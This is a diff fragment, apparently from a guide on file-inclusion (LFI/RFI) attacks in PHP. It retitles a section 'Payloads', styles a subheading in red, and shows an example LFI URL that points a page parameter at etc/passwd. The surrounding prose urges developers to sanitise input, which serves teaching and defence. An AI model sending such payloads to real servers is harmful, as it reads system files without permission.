@@ -98,9 +98,9 @@ return ($ input);
 
 Now I hope you can see what’s going on inside this function, so you can add yours. I would suggest using the str_replace () function and there are a lot of other functions to clear them. Be considerate and stop the RFI & LFI exploit frenzy!
 
-## Explotación
+## Payloads
 
-#### [+] Basic LFI (null byte, double encoding and other tricks) :
+#### [+] <b style=color:red>Basic LFI (null byte, double encoding and other tricks) :</b>
 
 ```
 http://example.com/index.php?page=etc/passwd
